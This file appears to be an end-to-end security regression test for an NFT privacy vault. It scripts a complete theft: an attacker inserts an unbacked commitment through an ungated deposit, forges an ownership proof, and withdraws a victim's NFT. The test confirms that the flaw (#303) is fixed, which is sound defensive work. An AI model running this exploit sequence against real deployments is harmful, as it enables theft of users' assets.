/**
 * E2E #303 — ERC721 NFT theft via a forged ownership proof.
 *
 * A victim deposits NFT #id (real, custodied by the vault). The attacker inserts an unbacked
 * commitment through the ungated `Erc721CoinVault.deposit`, forges its ownership proof via the
 * proofs-api, and withdraws the victim's NFT through the public `Dvp.withdrawERC721`.
 *
 * Verdict (asserted == 'FIXED' → RED while vulnerable, GREEN once deposit is gated):
 *   VULNERABLE_THEFT            attacker now owns the victim's NFT — exploit complete
 *   VULNERABLE_DEPOSIT_UNGATED  the ungated deposit landed but the exploit didn't finish
 *                               (e.g. proofs-api down) — still vulnerable, so still RED
 *   FIXED                       the deposit was rejected → the attack could not start
 *
 * Requires the dev stack (private-hub + relayer-a + proofs-api :3003).
 */

import { expect } from 'chai';
import axios from 'axios';
import { ethers } from 'ethers';
import { DEFAULT_TIMEOUT, GAS_LIMIT, LOGGER } from '../../../src/config/env-config';
import { retry, submitTx } from '../../../src/utils/common';
import { isNonceError, isTransientRpcError } from '../../../src/exceptions-and-errors/block-chain-exceptions';
import { initializePrivacyNodesAndPnh, PrivacyNodeMap } from '../../setup';
import { PrivateHub } from '../../../src/entities/PrivateHub';
import { ERC721Wrapper } from '../../../src/entities/tokens/ERC721Wrapper';
import {
  ProductionErc721Dvp, ProductionErc721Dvp__factory,
  DvpErc721PNH, DvpErc721PNH__factory,
  Erc721CoinVault, Erc721CoinVault__factory,
  DvpTeleport, Dvp, Dvp__factory,
} from '../../../typechain-types';
import { createUserOperator } from '../../../src/utils/wallet-factory';
import type { IDvp } from '../../../typechain-types';
import { SUBGROUP, TREE_DEPTH, PROOFS_API, randField, withRetry, reconstructPath } from './dvp-proof-helpers';

describe('E2E SECURITY: Erc721CoinVault NFT theft via forged proof (#303) @security @erc721 @dvp', function () {
  this.retries(0);
  this.timeout(DEFAULT_TIMEOUT * 2);

  let privacyNodes: PrivacyNodeMap;
  let privateHub: PrivateHub;
  let nft: ERC721Wrapper<ProductionErc721Dvp>;
  let pnhToken: DvpErc721PNH;
  let assetAddr: string;
  let vaultAddr: string;
  let attacker: ethers.HDNodeWallet;
  let stolenNftId: bigint;
  let anchorBlock: number; // bounds eth_getLogs to this test's window (node caps the log range)
  let poseidon: ethers.Contract;

  // Hash with the SAME on-chain PoseidonWrapper the vault/circuit use — no off-chain reimplementation.
  const H = async (a: bigint, b: bigint): Promise<bigint> =>
    withRetry(async () => ethers.toBigInt(await poseidon.poseidon([a, b])));

  before(async function () {
    const { initializedNodes, initializedPNH } = await initializePrivacyNodesAndPnh(2);
    anchorBlock = await initializedPNH.provider.getBlockNumber();
    privacyNodes = initializedNodes;
    privateHub = initializedPNH;

    // Victim: register a DVP ERC721, mint an NFT, honestly deposit it into the vault.
    nft = new ERC721Wrapper<ProductionErc721Dvp>(privacyNodes.A, ProductionErc721Dvp__factory);
    nft.setFields('dvp721-303-theft');
    await nft.deploy();
    await nft.activateOnPn();
    await nft.activateOnHub(privateHub);
    stolenNftId = await nft.mintAndAwait(privateHub, { toAddress: nft.userWallet.address });
    await nft.depositNftToDvp(privateHub, stolenNftId);

    pnhToken = DvpErc721PNH__factory.connect(await privateHub.getPNHContract<DvpErc721PNH>(nft.symbol).getAddress(), privateHub.provider);
    vaultAddr = await pnhToken.vaultAddress();
    const vaultRO = Erc721CoinVault__factory.connect(vaultAddr, privateHub.provider);
    assetAddr = await vaultRO.getAssetContractAddress();
    poseidon = new ethers.Contract(await vaultRO.getHashContractAddress(), ['function poseidon(uint256[2] input) view returns (uint256)'], privateHub.provider);

    attacker = createUserOperator(privateHub.provider);
    await retry(async () => { const t = await privateHub.adminWallet.sendTransaction({ to: attacker.address, value: ethers.parseEther('0.2') }); await t.wait(); },
      { attempts: 5, delayMs: 500, retryIf: (e) => isNonceError(e) || isTransientRpcError(e) });

    expect((await pnhToken.ownerOf(stolenNftId)).toLowerCase(), 'vault must custody the victim NFT').to.equal(vaultAddr.toLowerCase());
    LOGGER.log(`   victim NFT #${stolenNftId} custodied by vault ${vaultAddr}; attacker=${attacker.address}`);
  });

  it('attacker steals a victim-deposited NFT with a self-forged ownership proof', async function () {
    const vault: Erc721CoinVault = Erc721CoinVault__factory.connect(vaultAddr, attacker);
    const dvpTeleport = privateHub.getContract<DvpTeleport>('DvpTeleport');
    let depositLanded = false;

    try {
      // Attacker's own keypair; commitment for the victim's NFT (P = Poseidon(sk,sk)%subgroup).
      const sk = ethers.toBigInt(ethers.randomBytes(31)) % SUBGROUP;
      const P = (await H(sk, sk)) % SUBGROUP;
      const depositSalt = randField();
      const uid = await H(ethers.toBigInt(assetAddr), stolenNftId);
      const leaf = await H(await H(P, depositSalt), uid);

      // Insert the unbacked commitment via the ungated deposit (no NFT moved).
      await submitTx(() => vault.deposit([stolenNftId, P, depositSalt], { gasLimit: GAS_LIMIT }), 'attacker deposit (unbacked commitment) #303 ERC721');
      depositLanded = true;

      // Reconstruct the Merkle path and forge the ownership proof.
      const { indices, elements, root, treeNumber } = await reconstructPath(dvpTeleport, assetAddr, leaf, H, anchorBlock);
      expect(await withRetry(() => vault.verifyRoot(treeNumber, root)), 'reconstructed root must be a valid on-chain root').to.equal(true);

      const withdrawSalt = randField();
      const resp = (await withRetry(() => axios.post(`${PROOFS_API}/ownership-721`, {
        paymentCommitment: '0', uid: uid.toString(), saltIn: depositSalt.toString(), saltOut: withdrawSalt.toString(), revertSalt: randField().toString(),
        keyPairIn: { publicKey: P.toString(), privateKey: sk.toString() },
        pubKeyOut: { publicKey: ethers.toBigInt(attacker.address).toString() },
        merkleDepth: TREE_DEPTH, merkleProof: { indices: indices.toString(), elements: elements.map(String) },
        merkleRoot: root.toString(), treeNumber: Number(treeNumber),
      }, { timeout: 60_000 }))).data;
      const receipt = ownershipReceipt(resp);

      // Withdraw the victim's NFT via the permissionless Dvp facade.
      const dvp: Dvp = Dvp__factory.connect(privateHub.dvpAddress, attacker);
      await submitTx(() => dvp.withdrawERC721(assetAddr, stolenNftId, attacker.address, withdrawSalt, receipt, '0x', { gasLimit: GAS_LIMIT }), 'attacker withdrawERC721 #303');
    } catch (e: any) {
      LOGGER.log(`   attack chain halted — ${e?.shortMessage ?? e?.message ?? e}`);
    }

    // Outcome, straight from on-chain ownership.
    let owner = 'none'; try { owner = (await withRetry(() => pnhToken.ownerOf(stolenNftId))).toLowerCase(); } catch { /* burned/nonexistent */ }
    const attackerOwnsNft = owner === attacker.address.toLowerCase();
    const verdict = attackerOwnsNft ? 'VULNERABLE_THEFT' : depositLanded ? 'VULNERABLE_DEPOSIT_UNGATED' : 'FIXED';
    LOGGER.log(`   RESULT: NFT #${stolenNftId} owner = ${owner} (vault=${vaultAddr.toLowerCase()}, attacker=${attacker.address.toLowerCase()})`);
    LOGGER.log(`   VERDICT: ${verdict}`);

    expect(
      verdict,
      '#303: the ungated Erc721CoinVault.deposit let an unauthenticated attacker insert an unbacked ' +
        'commitment and (VULNERABLE_THEFT) withdraw the victim\'s NFT. Gate deposit with `restricted`. ' +
        'VULNERABLE_DEPOSIT_UNGATED means the deposit still landed (vuln present; attack halted incidentally).',
    ).to.equal('FIXED');
  });
});

function ownershipReceipt(r: any): IDvp.ProofReceiptStruct {
  if (!r?.pi_a || !r?.pi_b || !r?.pi_c || !Array.isArray(r?.public_signal))
    throw new Error(`proofs-api /ownership-721 returned an unexpected shape: ${JSON.stringify(r)}`);
  expect(r.public_signal.length, 'ownership-721 public signal must be length 6').to.equal(6); // [0]=msg,[1]=root,[2]=nullifier,[3]=tree,[4]=commitment,[5]=revert
  return {
    proof: { a: { x: r.pi_a[0], y: r.pi_a[1] }, b: { x: [r.pi_b[0][0], r.pi_b[0][1]], y: [r.pi_b[1][0], r.pi_b[1][1]] }, c: { x: r.pi_c[0], y: r.pi_c[1] } },
    treeNumbers: [r.public_signal[3]], message: r.public_signal[0], merkleRoots: [r.public_signal[1]],
    commitments: [r.public_signal[4]], nullifiers: [r.public_signal[2]], revertCommitment: r.public_signal[5],
  };
}
